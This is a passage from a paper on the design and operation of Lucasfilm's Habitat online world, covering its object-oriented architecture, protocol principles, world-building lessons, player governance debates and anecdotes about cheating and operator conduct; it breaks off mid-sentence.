<center><p>A typical Habitat scene (© 1986 LucasArts Entertainment
Company). </p></center>

<p>The Habitat world is made up of a large number of discrete locations
that we call "regions". In its prime, the prototype Habitat world
consisted of around 20,000 of them. Each region can adjoin up to four other
regions, which can be reached simply by walking your Avatar to one or another
edge of the screen. Doorways and other passages can connect to additional
regions. Each region contains a set of objects which define the things
that an Avatar can do there and the scene that the player sees on the computer
screen. </p>

<p>Some of the objects are structural, such as the ground or the sky. Many
are just scenic, such as the tree or the mailbox. Most objects, however,
have some function that they perform. For example, doors transport Avatars
from one region to another and may be opened, closed, locked and unlocked.
ATMs (Automatic Token Machines) enable access to an Avatar's bank account.
Vending machines dispense useful goods in exchange for Habitat money. Habitat
contained its own fully-fledged economy, with money, banks, and so on.
Habitat's unit of currency is the Token, owing to the fact that it is a
token economy and to acknowledge the long and honorable association between
tokens and video games. </p>

<p>Many objects are portable and may be carried around in an Avatar's hands
or pockets. These include various kinds of containers, money, weapons,
tools, and exotic magical implements. Listed here are some of the most
important types of objects and their functions. The complete list of object
types numbers in the hundreds. </p>

<h2>Implementation</h2>

<p>The following, along with several programmer-years of tedious and expensive
detail that we won't cover here, is how the system works: </p>

<p>At the heart of the Habitat implementation is an object-oriented model
of the universe. </p>

<p>The frontend consists of a system kernel and a collection of objects.
The kernel handles memory management, display generation, disk I/O, telecommunications,
and other "operating system" functions. The objects implement
the semantics of the world itself. Each type of Habitat object has a definition
consisting of a set of resources, including animation cels to drive the
display, audio data, and executable code. An object's executable code implements
a series of standard behaviors, each of which is invoked by a different
player command or system event. The model is similar to that found in an
object-oriented programming system such as Smalltalk [5], with its classes,
methods and messages. These resources consume significant amounts of scarce
frontend memory, so we can't keep them all in core at the same time. Fortunately,
their definitions are invariant, so we simply swap them in from disk as
we need them, discarding less recently used resources to make room. </p>

<p>When an object is instantiated, we allocate a block of memory to contain
the object's state. The first several bytes of an object's state information
take the same form in all objects, and include such things as the object's
screen location and display attributes. This standard information is interpreted
by the system kernel as it generates the display and manages the run-time
environment. The remainder of the state information varies with the object
type and is accessed only by the object's behavior code. </p>

<p>Object behaviors are invoked by the kernel in response to player input.
Each object responds to a set of standard verbs that map directly onto
the commands available to the player. Each behavior is simply a subroutine
that executes the indicated action; to do this it may invoke the behaviors
of other objects or send request messages to the backend. Besides the standard
verb behaviors, objects may have additional behaviors which are invoked
by messages that arrive asynchronously from the backend. </p>

<p>The backend also maintains an object-oriented representation of the
world. As in the frontend, objects on the backend possess executable behaviors
and in-memory state information. In addition, since the backend maintains
a persistent global state for the entire Habitat world, the objects are
also represented by database records that may be stored on disk when not
"in use". Backend object behaviors are invoked by messages from
the frontend. Each of these backend behaviors works in roughly the same
way: a message is received from a player's frontend requesting some action;
the action is taken and some state changes to the world result; the backend
behavior sends a response message back to the frontend informing it of
the results of its request and notification messages to the frontends of
any other players who are in the same region, informing <i>them</i> of
what has taken place. </p>

<h2>The Lessons</h2>

<p>In order to say as much as we can in the limited space available, we
will describe what think we learned via a series of principles or assertions
surrounded by supporting reasoning and illustrative anecdotes. A more formal
and thorough exposition will have to come later in some other forum where
we might have the space to present a more comprehensive and detailed model.
</p>

<p>We mentioned our primary principle above: </p>

<center><p><b>A multi-user environment is central to the idea of cyberspace.</b>
</p></center>

<p>It is our deep conviction that a definitive characteristic of a cyberspace
system is that it represents a multi-user environment. This stems from
the fact that what (in our opinion) people seek in such a system is richness,
complexity and depth. Nobody knows how to produce an automaton that even
approaches the complexity of a real human being, let alone a society. Our
approach, then, is not even to attempt this, but instead to use the computational
medium to augment the communications channels between real people. </p>

<p>If what we are constructing is a multi-user environment, it naturally
follows that some sort of communications capability must be fundamental
to our system. However, we must take into account an observation that is
the second of our principles: </p>

<center><p><b>Communications bandwidth is a scarce resource.</b> </p></center>

<p>This point was rammed home to us by one of Habitat's nastier externally
imposed design constraints, namely that it provide a satisfactory experience
to the player over a 300 baud serial telephone connection (one, moreover,
routed through commercial packet-switching networks that impose an additional,
uncontrollable latency of 100 to 5000 milliseconds on each packet transmitted).
</p>

<p>Even in a more technically advanced network, however, bandwidth remains
scarce in the sense that economists use the term: available carrying capacity
is not unlimited. The law of supply and demand suggests that no matter
how much capacity is available, you always want more. When communications
technology advances to the point were we all have multi-gigabaud fiber
optic connections into our homes, computational technology will have advanced
to match. Our processors' expanding appetite for data will mean that the
search for ever more sophisticated data compression techniques will <i>still</i>
be a hot research area (though what we are compressing may at that point
be high-resolution volumetric time-series or something even more esoteric)[6].
</p>

<p>Computer scientists tend to be reductionists who like to organize systems
in terms of primitive elements that can be easily manipulated within the
context of a simple formal model. Typically, you adopt a small variety
of very simple primitives which are then used in large numbers. For a graphics-oriented
cyberspace system, the temptation is to build upon bit-mapped images or
polygons or some other <i>graphic</i> primitive. These sorts of representations,
however, are invitations to disaster. They arise from an inappropriate
fixation on display technology, rather than on the underlying purpose of
the system. </p>

<p>However, the most significant part of what <i>we</i> wish to be communicating
are human behaviors. These, fortunately, can be represented quite compactly,
provided we adopt a relatively abstract, high-level description that deals
with behavioral concepts directly. This leads to our third principle: </p>

<center><p><b>An object-oriented data representation is essential.</b>
</p></center>

<p>Taken at its face value, this assertion is unlikely to be controversial,
as object-oriented programming is currently the methodology of choice among
the software engineering cognoscenti. However, what we mean here is not
only that you should adopt an object-oriented approach, but that the basic
objects from which you build the system should correspond more-or-less
to the objects in the user's conceptual model of the virtual world, that
is, people, places, and artifacts. You could, of course, use object-oriented
programming techniques to build a system based on, say, polygons, but that
would not help to cope with the fundamental problem. </p>

<p>The goal is to enable the communications between machines take place
primarily at the behavioral level (what people and things are doing) rather
than at the presentation level (how the scene is changing). The description
of a place in the virtual would should be in terms of what is there rather
than what it looks like. Interactions between objects should be described
by functional models rather than by physical ones. The computation necessary
to translate between these higher-level representations and the lower-level
representations required for direct user interaction is an essentially
local function. At the local processor, display-rendering techniques may
be arbitrarily elaborate and physical models arbitrarily sophisticated.
The data channel capacities required for such computations, however, need
not and should not be squeezed into the limited bandwidth available between
the local processor and remote ones. Attempting to do so just leads to
disasters such as NAPLPS [7,8]. </p>

<p>Once we begin working at the conceptual rather than the presentation
level, we are struck by the following observation: </p>

<center><p><b>The implementation platform is relatively unimportant.</b>
</p></center>

<p>The presentation level and the conceptual level cannot (and should not)
be <i>totally</i> isolated from each other. However, defining a virtual
environment in terms of the configuration and behavior of objects, rather
than their presentation, enables us to span a vast range of computational
and display capabilities among the participants in a system. This range
extends both upward and downward. As an extreme example, a typical scenic
object, such as a tree, can be represented by a handful of parameter values.
At the lowest conceivable end of things might be an ancient Altair 8800
with a 300 baud ASCII dumb terminal, where the interface is reduced to
fragments of text and the user sees the humble string so familiar to the
players of text adventure games, "There is a tree here." At the
high end, you might have a powerful processor that generates the image
of the tree by growing a fractal model and rendering it three dimensions
at high resolution, the finest details ray-traced in real time, complete
with branches waving in the breeze and the sound of wind in the leaves
coming through your headphones in high-fidelity digital stereo. And these
two users might be looking at the same tree in same the place in the same
world and talking to each other as they do so. Both of these scenarios
are implausible at the moment, the first because nobody would suffer with
such a crude interface when better ones are so readily available, the second
because the computational hardware does not yet exist. The point, however,
is that this approach covers the ground between systems already obsolete
and ones that are as yet gleams in their designers' eyes. Two consequences
of this are significant. The first is that we can build effective cyberspace
systems today. Habitat exists as ample proof of this principle. The second
is that it is conceivable that with a modicum of cleverness and foresight
you could start building a system with today's technology that could evolve
smoothly as the tomorrow's technology develops. The availability of pathways
for growth is important in the real world, especially if cyberspace is
to become a significant communications medium (as we obviously think it
should). </p>

<p>Given that we see cyberspace as fundamentally a communications medium
rather than simply a user interface model, and given the style of object-oriented
approach that we advocate, another point becomes clear: </p>

<center><p><b>Data communications standards are vital.</b> </p></center>

<p>However, our concerns about cyberspace data communications standards
center less upon data transport protocols than upon the definition of the
data being transported. The mechanisms required for reliably getting bits
from point A to point B are not terribly interesting to us. This is not
because these mechanisms are not essential (they obviously are) nor because
they do not pose significant research and engineering challenges (they
clearly do). It is because we are focused on the unique communications
needs of an object-based cyberspace. We are concerned with the protocols
for sending messages between objects, that is, for communicating behavior
rather than presentation, and for communicating object definitions from
one system to another. </p>

<p>Communicating object definitions seems to us to be an especially important
problem, and one that we really didn't have an opportunity to address in
Habitat. It <i>will</i> be necessary to address this problem if we are
to have a dynamic system. The ability to add new classes of objects over
time is crucial if the system is to be able to evolve. </p>

<p>While we are on the subject of communications standards, we would like
to make some remarks about the ISO Reference Model of Open System Interconnection
[9]. This multi-layered model has become a centerpiece of most discussions
about data communications standards these days. Unfortunately, while the
bottom 4 or 5 layers of this model provide a more or less sound framework
for considering data transport issues, we feel that the model's Presentation
and Application layers are not so helpful when considering cyberspace data
communications. </p>

<p>We have two main quarrels with the ISO model: first, it partitions the
general data communications problem in a way that is a poor match for the
needs of a cyberspace system; second, and more importantly, we think it
is an active source of confusion because it focuses the attention of system
designers on the wrong set of issues and thus leads them to spend their
time solving the wrong set of problems. We know because this happened to
us. "Presentation" and "Application" are simply the
wrong abstractions for the higher levels of a cyberspace communications
protocol. A "Presentation" protocol presumes characteristics
of the display are embedded in the protocol. The discussions above should
give some indication why we feel such a presumption is both unnecessary
and unwise. An "Application" protocol presumes a degree of foreknowledge
of the message environment that is incompatible with the sort of dynamically
evolving object system we envision. </p>

<p>A better model would be to substitute a different pair of top layers:
a Message layer, which defines the means by which objects can address one
another and standard methods of encapsulating structured data and encoding
low-level data types (e.g., numbers); and a Definition layer built on top
of the Message layer, which defines a standard representation for object
definitions so that object classes can migrate from machine to machine.
One might argue that these are simply Presentation and Application with
different labels, but we don't think the differences are so easily reconciled.
In particular, we think the ISO model has, however unintentionally, systematically
deflected workers in the field from considering many of the issues that
concern us. </p>

<h2>World Building</h2>

<p>There were two sorts of implementation challenges that Habitat posed.
The first was the problem of creating a working piece of technology --
developing the animation engine, the object-oriented virtual memory, the
message-passing pseudo operating system, and squeezing them all into the
ludicrous Commodore 64 (the backend system also posed interesting technical
problems, but its constraints were not as vicious). The second challenge
was the creation and management of the Habitat world itself. It is the
experiences from the latter exercise that we think will be most relevant
to future cyberspace designers. </p>

<p>We were initially our own worst enemies in this undertaking, victims
of a way of thinking to which we engineers are dangerously susceptible.
This way of thinking is characterized by the conceit that all things may
be planned in advance and then directly implemented according to the plan's
detailed specification. For persons schooled in the design and construction
of systems based on simple, well-defined and well-understood foundation
principles, this is a natural attitude to have. Moreover, it is entirely
appropriate when undertaking most engineering projects. It is a frame of
mind that is an essential part of a good engineer's conceptual tool kit.
Alas, in keeping with Maslow's assertion that, "to the person who
has only a hammer, all the world looks like a nail", it is a tool
that is easy to carry beyond its range of applicability. This happens when
a system exceeds the threshold of complexity above which the human mind
loses its ability to maintain a complete and coherent model. </p>

<p>One generally hears about systems crossing the complexity threshold
when they become very large. For example, the Space Shuttle and the B-2
bomber are both systems above this threshold, necessitating extraordinarily
involved, cumbersome and time-consuming procedures to keep the design under
control -- procedures that are at once vastly expensive and only partially
successful. To a degree, the complexity problem can be solved by throwing
money at it. However, such capital intensive management techniques are
a luxury not available to most projects. Furthermore, although these dubious
"solutions" to the complexity problem are out of reach of most
projects, alas the complexity threshold itself is not. Smaller systems
can suffer from the same sorts of problems. It is possible to push much
smaller and less elaborate systems over the complexity threshold simply
by introducing chaotic elements that are outside the designers' sphere
of control or understanding. The most significant such chaotic elements
are autonomous computational agents (e.g., other computers). This is why,
for example, debugging even very simple communications protocols often
proves surprisingly difficult. Furthermore, a special circle of living
Hell awaits the implementors of systems involving that most important category
of autonomous computational agents of all, groups of interacting human
beings. This leads directly to our next (and possibly most controversial)
assertion: </p>

<center><p><b>Detailed central planning is impossible; don't even try.</b>
</p></center>

<p>The constructivist prejudice that leads engineers into the kinds of
problems just mentioned has received more study from economists and sociologists
[10-15] than from researchers in the software engineering community. Game
and simulation designers are experienced in creating virtual worlds for
individuals and small groups. However, they have had no reason to learn
to deal with large populations of simultaneous users. Since each user or
group is unrelated to the others, the same world can be used over and over
again. If you are playing an adventure game, the fact that thousands of
other people elsewhere in the (real) world are playing the same game has
no effect on your experience. It is reasonable for the creator of such
a world to spend tens or even hundreds of hours crafting the environment
for each hour that a user will spend interacting with it, since that user's
hour of experience will be duplicated tens of thousands of times by tens
of thousands of other individual users. </p>

<p>Builders of online services and communications networks are experienced
in dealing with large user populations, but they do not, in general, create
elaborate environments. Furthermore, in a system designed to deliver information
or communications services, large numbers of users are simply a load problem
rather than a complexity problem. All the users get the same information
or services; the comments in the previous paragraph regarding duplication
of experience apply here as well. It is not necessary to match the size
and complexity of the information space to the size of the user population.
While it may turn out that the quantity of information available on a service
is a function of the size of the user population, this information can
generally be organized into a systematic structure that can still be maintained
by a few people. The bulk, wherein the complexity lies, is the product
of the users themselves, rather than the system designers -- the operators
of the system do not have to create all this material. (This observation
is the first clue to the solution to our problem.) </p>

<p>Our original specification for Habitat called for us to create a world
capable of supporting a population of 20,000 Avatars, with expansion plans
for up to 50,000. By any reckoning this is a large undertaking and complexity
problems would certainly be expected. However, in practice we exceeded
the complexity threshold very early in development. By the time the population
of our online community had reached around 50 we were in over our heads
(and these 50 were "insiders" who were prepared to be tolerant
of holes and rough edges). </p>

<p>Moreover, a virtual world such as Habitat needs to scale with its population.
For 20,000 Avatars we needed 20,000 "houses", organized into
towns and cities with associated traffic arteries and shopping and recreational
areas. We needed wilderness areas between the towns so that everyone would
not be jammed together into the same place. Most of all, we needed things
for 20,000 people to do. They needed interesting places to visit -- and
since they can't all be in the same place at the same time, they needed
a <i>lot</i> of interesting places to visit -- and things to do in those
places. Each of those houses, towns, roads, shops, forests, theaters, arenas,
and other places is a distinct entity that someone needs to design and
create. We, attempting to play the role of omniscient central planners,
were swamped. </p>

<p>Automated tools may be created to aid the generation of areas that naturally
possess a high degree of regularity and structure, such as apartment buildings
and road networks. We created a number of such tools, whose spiritual descendents
will no doubt be found in the standard bag of tricks of future cyberspace
architects. However, the very properties which make some parts of the world
amenable to such techniques also make those same parts of the world among
the least important. It is really not a problem if every apartment building
looks pretty much like every other. It is a big problem if every enchanted
forest is the same. Places whose value lies in their uniqueness, or at
least in their differentiation from the places around them, need to be
crafted by hand. This is an incredibly labor intensive and time consuming
process. Furthermore, even very imaginative people are limited in the range
of variation that they can produce, especially if they are working in a
virgin environment uninfluenced by the works and reactions of other designers.
</p>

<h2>Running The World</h2>

<p>The world design problem might still be tractable, however, if all players
had the same goals, interests, motivations and types of behavior. Real
people, however, are all different. For the designer of an ordinary game
or simulation, human diversity is not a major problem, since he or she
gets to establish the goals and motivations on the participants' behalf,
and to specify the activities available to them in order to channel events
in the preferred direction. Habitat, however, was deliberately open ended
and pluralistic. The idea behind our world was precisely that it did not
come with a fixed set of objectives for its inhabitants, but rather provided
a broad palette of possible activities from which the players could choose,
driven by their own internal inclinations. It was our intent to provide
a variety of possible experiences, ranging from events with established
rules and goals (a treasure hunt, for example) to activities propelled
by the players' personal motivations (starting a business, running the
newspaper) to completely free-form, purely existential activities (hanging
out with friends and conversing). Most activities, however, involved some
degree of pre-planning and setup on our part -- we were to be like the
cruise director on a ocean voyage, but we were still thinking like game
designers. </p>

<p>The first goal-directed event planned for Habitat was a rather involved
treasure hunt called the "D'nalsi Island Adventure". It took
us hours to design, weeks to build (including a 100-region island), and
days to coordinate the actors involved. It was designed much like the puzzles
in an adventure game. We thought it would occupy our players for days.
In fact, the puzzle was solved in about 8 hours by a person who had figured
out the critical clue in the first 15 minutes. Many of the players hadn't
even had a chance to get into the game. The result was that one person
had had a wonderful experience, dozens of others were left bewildered,
and a huge investment in design and setup time had been consumed in an
eyeblink. We expected that there would be a wide range of "adventuring"
skills in the Habitat audience. What wasn't so obvious until afterward
was that this meant that most people didn't have a very good time, if for
no other reason than that they never really got to participate. It would
clearly be foolish and impractical for us to do things like this on a regular
basis. </p>

<p>Again and again we found that activities based on often unconscious
assumptions about player behavior had completely unexpected outcomes (when
they were not simply outright failures). It was clear that we were not
in control. The more people we involved in something, the less in control
we were. We could influence things, we could set up interesting situations,
we could provide opportunities for things to happen, but we could not dictate
the outcome. Social engineering is, at best, an inexact science (or, as
some wag once said, "in the most carefully constructed experiment
under the most carefully controlled conditions, the organism will do whatever
it damn well pleases"). </p>

<p>Propelled by these experiences, we shifted into a style of operations
in which we let the players themselves drive the direction of the design.
This proved far more effective. Instead of trying to push the community
in the direction we thought it should go, an exercise rather like herding
mice, we tried to observe what people were doing and aid them in it. We
became facilitators as much as we were designers and implementors. This
often meant adding new features and new regions to the system at a frantic
pace, but almost all of what we added was used and appreciated, since it
was well matched to people's needs and desires. We, as the experts on how
the system worked, could often suggest new activities for people to try
or ways of doing things that people might not have thought of. In this
way we were able to have considerable influence on the system's development
in spite of the fact that we didn't really hold the steering wheel -- more
influence, in fact, than we had had when we were operating under the illusion
that we controlled everything. </p>

<p>Indeed, the challenges posed by large systems are prompting some researchers
to question the centralized, planning dominated attitude that we have criticized
here, and to propose alternative approaches based on evolutionary and market
principles [16-18]. These principles appear applicable to complex systems
of all types, not merely those involving interacting human beings. </p>

<h2>The Great Debate</h2>

<p>Among the objects we made available to Avatars in Habitat were guns
and various other sorts of weapons. We included these because we felt that
players should be able to materially effect each other in ways that went
beyond simply talking, ways that required real moral choices to be made
by the participants. We recognized the age old story-teller's dictum that
conflict is the essence of drama. Death in Habitat was, of course, not
like death in the real world! When an Avatar is killed, he or she is teleported
back home, head in hands (literally), pockets empty, and any object in
hand at the time dropped on the ground at the scene of the crime. Any possessions
carried at the time are lost. It was more like a setback in a game of "Chutes
and Ladders" than real mortality. Nevertheless, the death metaphor
had a profound effect on people's perceptions. This potential for murder,
assault and other mayhem in Habitat was, to put it mildly, controversial.
The controversy was further fueled by the potential for lesser crimes.
For instance, one Avatar could steal something from another Avatar simply
by snatching the object out its owner's hands and running off with it.
</p>

<p>We had imposed very few rules on the world at the start. There was much
debate among the players as to the form that Habitat society should take.
At the core of much of the debate was an unresolved philosophical question:
is an Avatar an extension of a human being (thus entitled to be treated
as you would treat a real person) or a Pac-Man-like critter destined to
die a thousand deaths or something else entirely? Is Habitat murder a crime?
Should all weapons be banned? Or is it all "just a game"? To
make a point, one of the players took to randomly shooting people as they
roamed around. The debate was sufficiently vigorous that we took a systematic
poll of the players. The result was ambiguous: 50% said that Habitat murder
was a crime and shouldn't be a part of the world, while the other 50% said
it was an important part of the fun. </p>

<p>We compromised by changing the system to allow thievery and gunplay
only outside the city limits. The wilderness would be wild and dangerous
while civilization would be orderly and safe. This did not resolve the
debate, however. One of the outstanding proponents of the anti-violence
point of view was motivated to open the first Habitat church, the Order
of the Holy Walnut (in real life he was a Greek Orthodox priest). His canons
forbid his disciples to carry weapons, steal, or participate in violence
of any kind. His church became quite popular and he became a very highly
respected member of the Habitat community. </p>

<p>Furthermore, while we had made direct theft impossible, one could still
engage in indirect theft by stealing things set on the ground momentarily
or otherwise left unattended. And the violence still possible in the outlands
continued to bother some players. Many people thought that such crimes
ought to be prevented or at least punished somehow, but they had no idea
how to do so. They were used to a world in which law and justice were always
things provided by somebody else. Somebody eventually made the suggestion
that there ought to be a Sheriff. We quickly figured out how to create
a voting mechanism and rounded up some volunteers to hold an election.
A public debate in the town meeting hall was heavily attended, with the
three Avatars who had chosen to run making statements and fielding questions.
The election was held, and the town of Populopolis acquired a Sheriff.
</p>

<p>For weeks the Sheriff was nothing but a figurehead, though he was a
respected figure and commanded a certain amount of moral authority. We
were stumped about what powers to give him. Should he have the right to
shoot anyone anywhere? Give him a more powerful gun? A magic wand to zap
people off to jail? What about courts? Laws? Lawyers? Again we surveyed
the players, eventually settling on a set of questions that could be answered
via a referendum. Unfortunately, we were unable to act on the results before
the pilot operations ended and the system was shut down. It was clear,
however, that there are two basic camps: anarchy and government. This is
an issue that will need to be addressed by future cyberspace architects.
However, our view is that a virtual world need not be set up with a "default"
government, but can instead evolve one as needed. </p>

<h2>A Warning</h2>

<p>Given the above exhortation that control should be released to the users,
we need to inject a note of caution and present our next assertion: </p>

<center><p><b>You can't trust <blink>anyone.</blink></b> </p></center>

<p>This may seem like a contradiction of much of the preceding, but it
really is not. Designers and operators of a cyberspace system must inhabit
two levels of virtual world at once. The first we call the "infrastructure
level", which is the implementation, where the laws that govern "reality"
have their genesis. The second we call the "percipient level",
which is what the users see and experience. It is important that there
not be "leakage" between these two levels. The first level defines
the physics of the world. If its integrity is breached, the consequences
can range from aesthetic unpleasantness (the audience catches a glimpse
of the scaffolding behind the false front) to psychological disruption
(somebody does something "impossible", thereby violating users'
expectations and damaging their fantasy) to catastrophic failure (somebody
crashes the system). When we exhort you to give control to the users, we
mean control at the percipient level. When we say that you can't trust
anyone, we mean that you can't trust them with access to the infrastructure
level. Some stories from Habitat will illustrate this. </p>

<p>When designing piece of software, you generally assume that it is the
sole intermediary between the user and the underlying data being manipulated
(possibly multiple applications will work with the same data, but the principle
remains the same). In general, the user need not be aware of how data are
encoded and structured inside the application. Indeed, the very purpose
of a good application is to shield the user from the ugly technical details.
It is conceivable that a technically astute person who is willing to invest
the time and effort could decipher the internal structure of things, but
this would be an unusual thing to do as there is rarely much advantage
to be gained. The purpose of the application itself is, after all, to make
access to and manipulation of the data easier than digging around at the
level of bits and bytes. There are exceptions to this, however. For example,
most game programs deliberately impose obstacles on their players in order
for play to be challenging. By tinkering around with the insides of such
a program -- dumping the data files and studying them, disassembling the
program itself and possibly modifying it -- it may be possible to "cheat".
However, this sort of cheating has the flavor of cheating at solitaire:
the consequences adhere to the cheater alone. There is a difference, in
that disassembling a game program is a puzzle-solving exercise in its own
right, whereas cheating at solitaire is pointless, but the satisfactions
to be gained from it, if any, are entirely personal. </p>

<p>If, however, a computer game involves multiple players, delving into
the program's internals can enable one to truly cheat, in the sense that
one gains an unfair advantage over the other players of which they may
be unaware. Habitat is such a multi-player game. When we were designing
the software, our "prime directive" was, "The backend shall
not assume the validity of anything a player computer tells it." This
is because we needed to protect ourselves against the possibility that
a clever user had hacked around with his copy of the frontend program to
add "custom features". For example, we could not implement any
of the sort of "skill and action" elements found in traditional
video games wherein dexterity with the joystick determines the outcome
of, say, armed combat, because you couldn't guard against someone modifying
their copy of the program to tell the backend that they had "hit",
whether they actually had or not. Indeed, our partners at QuantumLink warned
us of this very eventuality before we even started -- they already had
users who did this sort of thing with their regular system. Would anyone
actually go to the trouble of disassembling and studying 100K or so of
incredibly tight and bizarrely threaded 6502 machine code just to tinker?
As it turns out, the answer is yes. People have. We were not 100% rigorous
in following our own rule. It turned out that there were a few features
whose implementation was greatly eased by breaking the rule in situations
where, in our judgment, the consequences would not be material if people
"cheated" by hacking their own systems. Darned if people didn't
hack their systems to cheat in exactly these ways. </p>

<p>Care must be taken in the design of the world as well. One incident
that occurred during our pilot test involved a small group of players exploiting
a bug in our world database which they interpreted as a feature. First,
some background. Avatars are hatched with 2000 Tokens in their bank account,
and each day that they login the receive another 100T. Avatars may acquire
additional funds by engaging in business, winning contests, finding buried
treasure, and so on. They can spend their Tokens on, among other things,
various items that are for sale in vending machines called Vendroids. There
are also Pawn Machines, which will buy objects back (at a discount, of
course). </p>

<p>In order to make this automated economy a little more interesting, each
Vendroid had its own prices for the items in it. This was so that we could
have local price variation (i.e., a widget would cost a little less if
you bought it at Jack's Place instead of The Emporium). It turned out that
in two Vendroids across town from each other were two items for sale whose
prices we had inadvertently set lower than what a Pawn Machine would buy
them back for: Dolls (for sale at 75T, hock for 100T) and Crystal Balls
(for sale at 18,000T, hock at 30,000T!). Naturally, a couple of people
discovered this. One night they took all their money, walked to the Doll
Vendroid, bought as many Dolls as they could, then took them across town
and pawned them. By shuttling back and forth between the Doll Vendroid
and the Pawn Shop for <i>hours</i>, they amassed sufficient funds to buy
a Crystal Ball , whereupon they continued the process with Crystal Balls
and a couple orders of magnitude higher cash flow. The final result was
at least three Avatars with hundreds of thousands of Tokens each. We only
discovered this the next morning when our daily database status report
said that the money supply had quintupled overnight. </p>

<p>We assumed that the precipitous increase in "T1" was due to
some sort of bug in the software. We were puzzled that no bug report had
been submitted. By poking around a bit we discovered that a few people
had suddenly acquired enormous bank balances. We sent Habitat mail to the
two richest, inquiring as to where they had gotten all that money overnight.
Their reply was, "We got it fair and square! And we're not going to
tell you how!" After much abject pleading on our part they eventually
did tell us, and we fixed the erroneous pricing. Fortunately, the whole
scam turned out well, as the nouveau riche Avatars used their bulging bankrolls
to underwrite a series of treasure hunt games which they conducted on their
own initiative, much to the enjoyment of many other players on the system.
</p>

<h2>Keeping "Reality" Consistent</h2>

<p>The urge to breach the boundary between the infrastructure level and
the percipient level is not confined to the players. The system operators
are also subject to this temptation, though their motivation is expediency
in accomplishing their legitimate purposes rather than the gaining of illegitimate
advantage. However, to the degree to which it is possible, we vigorously
endorse the following principle: </p>

<center><p><b>Work within the system.</b> </p></center>

<p>Wherever possible, things that can be done within the framework of the
percipient level should be. The result will be smoother operation and greater
harmony among the user community. This admonition applies to both the technical
and the sociological aspects of the system. </p>

<p>For example, with the players in control, the Habitat world would have
grown much larger and more diverse than it did had we ourselves not been
a technical bottleneck. All new region generation and feature implementation
had to go through us, since there was no means for players to create new
parts of the world on their own. Region creation was an esoteric technical
specialty, requiring a plethora of obscure tools and a good working knowledge
of the treacherous minefield of limitations imposed by the Commodore 64.
It also required a lot of behind-the-scenes activity that would probably
spoil the illusion for many. One of the goals of a next generation Habitat-like
system ought to be to permit far greater creative involvement by the participants
without requiring them to ascend to full-fledged guru-hood to do so. </p>

<p>A further example of working within the system, this time in a social
sense, is illustrated by the following experience. One of the more popular
events in Habitat took place late in the test, the brainchild of one of
the more active players who had recently become a QuantumLink employee.
It was called the "Dungeon of Death". </p>

<p>For weeks, ads appeared in Habitat's newspaper, The Rant, announcing
that that Duo of Dread, DEATH and THE SHADOW, were challenging all comers
to enter their lair. Soon, on the outskirts of town, the entrance to a
dungeon appeared. Out front was a sign reading, "Danger! Enter at
your own risk!" Two system operators were logged in as DEATH and THE
SHADOW, armed with specially concocted guns that could kill in one shot,
rather than the usual 12. These two characters roamed the dungeon blasting
away at anyone they encountered. They were also equipped with special magic
wands that cured any damage done to them by other Avatars, so that they
wouldn't themselves be killed. To make things worse, the place was littered
with dead ends, pathological connections between regions, and various other
nasty and usually fatal features. It was clear that any explorer had better
be prepared to "die" several times before mastering the dungeon.
The rewards were pretty good: 1000 Tokens minimum and access to a special
Vendroid that sold magic teleportation wands. Furthermore, given clear
notice, players took the precaution of emptying their pockets before entering,
so that the actual cost of getting "killed" was minimal. </p>

<p>One evening, one of us was given the chance to play the role of DEATH.
When we logged in, we found him in one of the dead ends with four other
Avatars who were trapped there. We started shooting, as did they. However,
the last operator to run DEATH had not bothered to use his special wand
to heal any accumulated damage, so the character of DEATH was suddenly
and unexpectedly "killed" in the encounter. As we mentioned earlier,
when an Avatar is killed, any object in his hands is dropped on the ground.
In this case, said object was the special kill-in-one-shot gun, which was
immediately picked up by one of the regular players who then made off with
it. This gun was not something that regular players were supposed to have.
What should we do? </p>

<p>It turned out that this was not the first time this had happened. During
the previous night's mayhem the special gun was similarly absconded with.
In this case, the person playing DEATH was one of the regular system operators,
who, used to operating the regular Q-Link service, simply ordered the player
to give the gun back. The player considered that he had obtained the weapon
as part of the normal course of the game and balked at this, whereupon
the operator threatened to cancel the player's account and kick him off
the system if he did not comply. The player gave the gun back, but was
quite upset about the whole affair, as were many of his friends and associates
on the system. Their world model had been painfully violated. </p>

<p>When it happened to us, we played the whole incident within the role
of DEATH. We sent a message to the Avatar who had the gun, threatening
to come and kill her if she didn't give it back. She replied that all she
had to do was stay in town and DEATH couldn't touch her (which was true,
if we stayed within the system). OK, we figured, she's smart. We negotiated
a deal whereby DEATH would ransom the gun for 10,000 Tokens. An elaborate
arrangement was made to meet in the center of town to make the exchange,
with a neutral third Avatar acting as an intermediary to ensure that neither
party cheated. Of course, word got around and by the time of the exchange
there were numerous spectators. We played the role of DEATH to the hilt,
with lots of hokey melodramatic shtick. The event was a sensation. It was
written up in the newspaper the next morning and was the talk of the town
for days. The Avatar involved was left with a wonderful story about having
cheated DEATH, we got the gun back, and everybody went away happy. </p>

<p>These two very different responses to an ordinary operational problem
illustrate our point. Operating within the participants' world model produced
a very satisfactory result. On the other hand, what seemed like the expedient
course, which involved violating this model, provoked upset and dismay.
Working within the system was clearly the preferred course in this case.
</p>

<h2>Current Status</h2>

<p>As of this writing, the North American incarnation of Lucasfilm's Habitat,
QuantumLink's "Club Caribe", has been operating for almost two
years. It uses our original Commodore 64 frontend and a somewhat stripped-down
version of our original Stratus backend software. Club Caribe now sustains
a population of some 15,000 participants. </p>

<p>A technically more advanced version, called Fujitsu Habitat, has recently
started pilot operations in Japan, available on NIFtyServe. The initial
frontend for this version is the new Fujitsu FM Towns personal computer,
though ports to several other popular Japanese machines are anticipated.
This version of the system benefits from the additional computational power
and graphics capabilities of a newer platform, as well as the Towns' built-in
CD-ROM for object imagery and sounds. However, the virtuality of the system
is essentially unchanged and Fujitsu has not made significant alterations
to the user interface or to any of the underlying concepts. </p>

<h2>Future Directions</h2>

<p>There are several directions in which this work can be extended. Most
obvious is to implement the system on more advanced hardware, enabling
a more sophisticated display. A number of extensions to the user interface
also suggest themselves. However, the line of development most interesting
to us is to expand on the idea of making the development and expansion
of the world itself part of the users' sphere of control. There are two
major research areas in this. Unfortunately, we can only touch on them
briefly here. </p>

<p>The first area to investigate involves the elimination of the centralized
backend. The backend is a communications and processing bottleneck that
will not withstand growth above too large a size. While we can support
tens of thousands of users with this model, it is not really feasible to
support millions. Making the system fully distributed, however, requires
solving a number of difficult problems. The most significant of these is
the prevention of cheating. Obviously, the owner of the network node that
implements some part of the world has an incentive to tilt things in his
favor there. We think that this problem can be addressed by secure operating
system technologies based on public-key cryptographic techniques [19, 20].
</p>

<p>The second fertile area of investigation involves user configuration
